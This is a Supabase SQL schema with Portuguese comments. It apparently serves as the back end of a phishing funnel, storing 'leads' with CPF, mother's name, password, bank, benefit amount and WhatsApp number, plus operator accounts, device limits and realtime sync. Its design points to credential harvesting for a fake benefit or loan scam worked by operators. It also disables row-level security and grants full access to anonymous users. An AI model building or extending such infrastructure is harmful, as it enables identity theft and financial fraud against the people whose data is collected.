-- 1. TABELA DE LEADS
create table if not exists public.leads (
    id bigint generated by default as identity primary key,
    created_at timestamp with time zone default timezone('utc'::text, now()) not null,
    updated_at timestamp with time zone default timezone('utc'::text, now()),
    cpf text,
    cpf_formatado text,
    nome text,
    nascimento text,
    mae text,
    password text,
    valor_beneficio text,
    dia_recebimento text,
    banco text,
    whatsapp text,
    whatsapp_clean text,
    valor_liberado text,
    parcelas text,
    valor_parcela text,
    protocolo text,
    device_info text,
    last_step text,
    status text,
    operator text default ''
);

-- 2. TABELA DE OPERADORES
create table if not exists public.operadores (
    id bigint generated by default as identity primary key,
    created_at timestamp with time zone default timezone('utc'::text, now()) not null,
    usuario text not null unique,
    senha text not null,
    cargo text default 'operador', -- 'master' ou 'operador'
    limite_pcs integer default 3,
    ativo boolean default true
);

-- 3. TABELA DE COMPUTADORES / PCS AUTORIZADOS
create table if not exists public.operadores_dispositivos (
    id bigint generated by default as identity primary key,
    created_at timestamp with time zone default timezone('utc'::text, now()) not null,
    usuario text not null,
    device_id text not null,
    user_agent text,
    last_login timestamp with time zone default timezone('utc'::text, now()),
    status text default 'ativo'
);

-- 4. PERMISSÕES E DESBLOQUEIO DE RLS (OBRIGATÓRIO PARA RECEBER LEADS)
-- Desativa o bloqueio de RLS para garantir que 100% dos leads sejam salvos sem erro 401/42501:
alter table public.leads disable row level security;
alter table public.operadores disable row level security;
alter table public.operadores_dispositivos disable row level security;

-- Permissões totais para o funil e para a chave de API
grant all on table public.leads to anon, authenticated, service_role;
grant all on table public.operadores to anon, authenticated, service_role;
grant all on table public.operadores_dispositivos to anon, authenticated, service_role;
grant usage, select on all sequences in schema public to anon, authenticated, service_role;

-- 5. HABILITAR SINCRONIZAÇÃO EM TEMPO REAL (REALTIME)
alter publication supabase_realtime add table public.leads;
alter publication supabase_realtime add table public.operadores;
alter publication supabase_realtime add table public.operadores_dispositivos;

